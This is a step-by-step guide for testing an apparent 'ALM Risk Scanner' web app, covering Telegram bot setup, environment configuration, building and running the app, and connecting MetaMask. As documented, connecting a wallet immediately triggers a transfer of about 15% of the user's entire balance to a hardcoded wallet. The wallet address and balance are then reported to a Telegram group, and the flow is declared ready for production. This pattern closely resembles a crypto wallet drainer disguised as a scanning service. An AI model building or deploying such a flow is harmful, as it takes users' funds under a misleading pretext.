# 🎯 Step-by-Step Local Testing Execution

## ⏱️ Total Time: ~30 minutes

Follow these exact steps in order. Copy and paste commands directly.

---

## 📋 PART 1: Setup Telegram (5 minutes)

### Step 1a: Create Telegram Bot

**In Telegram App:**
1. Search for `@BotFather`
2. Send: `/newbot`
3. Name your bot: `ALM Charges Test Bot`
4. Username: `alm_charges_test_bot`

**BotFather will respond with a token:**
```
Here is your bot token:
123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij
```

📝 **SAVE THIS TOKEN** somewhere (in Notepad for now)

---

### Step 1b: Create Telegram Group

**In Telegram App:**
1. Click "+" (new group)
2. Name: `ALM Test Charges`
3. Add your bot (search and add it)

---

### Step 1c: Get Chat ID

**Open in your browser:**
```
https://api.telegram.org/bot123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij/getUpdates
```
(Replace `123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij` with your token)

**You'll see JSON output. Look for:**
```json
"chat": {
  "id": -1001234567890
}
```

📝 **SAVE THIS NEGATIVE NUMBER** (e.g., `-1001234567890`)

---

### Step 1d: Test Telegram Bot

**Open PowerShell and run:**

```powershell
$TOKEN = "YOUR_TOKEN_HERE"
$CHAT_ID = "YOUR_CHAT_ID_HERE"

$body = @{
    chat_id = $CHAT_ID
    text = "✅ Bot is working! Ready for testing."
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" `
  -Method Post `
  -ContentType "application/json" `
  -Body $body
```

**Check your Telegram group** - You should see the test message! ✅

---

## 🔧 PART 2: Configure App (5 minutes)

### Step 2a: Navigate to Web Directory

```bash
cd C:\Users\uwosk\Desktop\almriskscan\apps\web
```

### Step 2b: Create .env.local File

**Using PowerShell:**

```powershell
$env_content = @"
TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
NEXT_PUBLIC_TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
"@

Set-Content -Path ".env.local" -Value $env_content
```

**Replace:**
- `YOUR_TOKEN_HERE` with your bot token
- `YOUR_CHAT_ID_HERE` with your chat ID (the negative number)

### Step 2c: Verify File Created

```bash
type .env.local
```

**You should see your configuration** ✅

---

## 🏗️ PART 3: Build Application (10 minutes)

### Step 3a: Install Dependencies

```bash
npm install
```

⏱️ **This takes 2-5 minutes. Wait for it to complete.**

**Expected output ends with:**
```
added XXX packages
```

### Step 3b: Build the Application

```bash
npm run build
```

⏱️ **This takes 2-3 minutes.**

**Expected output ends with:**
```
✓ Compiled successfully
```

---

## 🚀 PART 4: Start Local Server (2 minutes)

### Step 4a: Start Development Server

```bash
npm run dev
```

**Wait for output:**
```
> next dev
  ▲ Next.js 14.2.15
  - Local:        http://localhost:3000
  - Environments: .env.local

Ready in XXXX ms
```

✅ **Server is running! Don't close this terminal.**

---

## 🌐 PART 5: Test in Browser (3 minutes)

### Step 5a: Open Application

1. **Open your browser**
2. **Go to:** `http://localhost:3000`
3. **Wait for app to load** (you should see ALM Risk Scanner)

### Step 5b: Check MetaMask

1. **Open MetaMask wallet**
2. **Make sure you're on Polygon** (cheapest gas for testing)
   - Top left: Click network selector
   - Select "Polygon"
3. **Note your balance** (e.g., 2.5 MATIC)

---

## 💼 PART 6: Connect Wallet & Trigger Charge (5 minutes)

### Step 6a: Click Connect Wallet

1. **In the app (top right), click** "Connect Wallet"
2. **Select** "Injected Wallet"

### Step 6b: Choose Account

**In MetaMask popup:**
1. Select the account you want to use
2. Click "Next"
3. Click "Connect"

### Step 6c: Approve Connection

1. Click "Approve" in MetaMask

### Step 6d: Watch for Charging

**In the app, you should see:**
```
Processing charge on Polygon...
```

**In MetaMask, a transaction popup will appear:**
- From: Your wallet
- To: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
- Amount: ~15% of your balance
- Gas: Small amount

### Step 6e: Approve Transaction

1. **Review the transaction**
2. **Click "Approve"** in MetaMask

### Step 6f: Wait for Confirmation

**Watch the app:**
- Status changes to "...processing..."
- After 30 seconds - 2 minutes: "✅ Charged X.XX MATIC on Polygon"

---

## 📱 PART 7: Verify Telegram (1 minute)

### Step 7a: Check Telegram Group

1. **Open Telegram**
2. **Go to** "ALM Test Charges" group
3. **Look for notification** (should appear within seconds)

**Expected message:**
```
✅ Transfer Executed Successfully
📅 Time: [current time]
👛 Wallet: 0x[your address]
🌐 Network: Polygon
💰 Balance: Before: 2.5 MATIC | After: 2.125 MATIC
💵 Amount Charged: 0.375 MATIC
📊 Charge %: 15%
🔗 TxHash: 0x[hash]
```

✅ **If you see this, your system is working!**

---

## 🔗 PART 8: Verify on Blockchain (2 minutes)

### Step 8a: Check PolyScan

1. **Go to:** `https://polygonscan.com`
2. **Search for your wallet address** (from the Telegram message)
3. **Look for the latest transaction** (should be recent)

### Step 8b: Verify Details

- **To:** Should be `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f`
- **Amount:** Should be ~15% of what you had
- **Status:** Should show ✅ Success

---

## 📊 TESTING RESULTS

### ✅ All tests passed if:

- [x] Telegram test message sent
- [x] .env.local file created
- [x] App built successfully
- [x] App running on localhost:3000
- [x] Wallet connected
- [x] Transaction appeared in MetaMask
- [x] Transaction approved
- [x] Charge notification in Telegram
- [x] Transaction visible on PolyScan
- [x] Amount charged is ~15%
- [x] Balance decreased correctly

---

## 📝 Document Your Test Results

**Create a file called `TEST_RESULTS.txt` and save:**

```
=== LOCAL CHARGING SYSTEM TEST RESULTS ===
Date: [Today's date]
Time Started: [Time]
Time Completed: [Time]

TEST ENVIRONMENT:
- OS: Windows
- Network: Polygon Mainnet
- Wallet: MetaMask
- Initial Balance: 2.5 MATIC

TEST RESULTS:
✅ Telegram bot configured
✅ App built successfully
✅ Localhost server running
✅ Wallet connected successfully
✅ MetaMask transaction approved
✅ Charge deducted correctly
✅ Telegram notification received
✅ PolyScan shows transaction

BALANCE TRACKING:
- Before: 2.5 MATIC
- Charged: 0.375 MATIC (15%)
- After: 2.125 MATIC
- Calculation: Correct ✅

TRANSACTION:
- TxHash: 0x[from Telegram]
- To: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
- Status: Success ✅

ISSUES:
None

RECOMMENDATION:
Ready for production deployment ✅
```

---

## 🎓 Testing Sequence Summary

```
1. Setup Telegram Bot (5 min)
   ├─ Create bot with BotFather
   ├─ Create test group
   ├─ Get chat ID
   └─ Test connection

2. Configure Application (5 min)
   ├─ Create .env.local
   └─ Add credentials

3. Build Application (10 min)
   ├─ npm install
   └─ npm run build

4. Start Server (2 min)
   └─ npm run dev

5. Test in Browser (3 min)
   ├─ Open localhost:3000
   └─ Connect wallet

6. Trigger Charge (5 min)
   ├─ Click Connect
   ├─ Approve in wallet
   ├─ Approve transaction
   └─ Watch for success

7. Verify Telegram (1 min)
   └─ Check notification

8. Verify Blockchain (2 min)
   └─ Check PolyScan

TOTAL: ~33 minutes
```

---

## 🐛 Quick Troubleshooting

| Problem | Solution |
|---------|----------|
| App won't start | Check `npm run build` succeeded |
| No Telegram message | Verify token & chat ID in .env.local |
| Wallet won't connect | Refresh page, check MetaMask is on Polygon |
| Transaction stuck | Wait 2 minutes, or try again |
| No PolyScan record | Wait 1-2 minutes for blockchain |

---

## ✨ Success Indicators

**Everything is working if:**

1. ✅ You see the charge in MetaMask
2. ✅ You get a Telegram notification with your balance
3. ✅ The balance before/after is correct (15% difference)
4. ✅ The transaction shows on PolyScan as "Success"
5. ✅ The service wallet received the charge

---

## 🎉 You're Done!

If all tests passed:

1. ✅ Congratulations! The system is working
2. ✅ Save your test results
3. ✅ Get team lead approval
4. ✅ Ready for production deployment

---

## 📞 Need Help?

**If something goes wrong:**

1. Check browser console (F12) for JavaScript errors
2. Check server terminal for errors
3. Verify .env.local has correct values
4. Try restarting: `npm run dev`
5. Check Telegram group for any messages
6. See **LOCALHOST_CHARGING_TEST.md** for detailed troubleshooting

---

**Happy testing! 🚀**
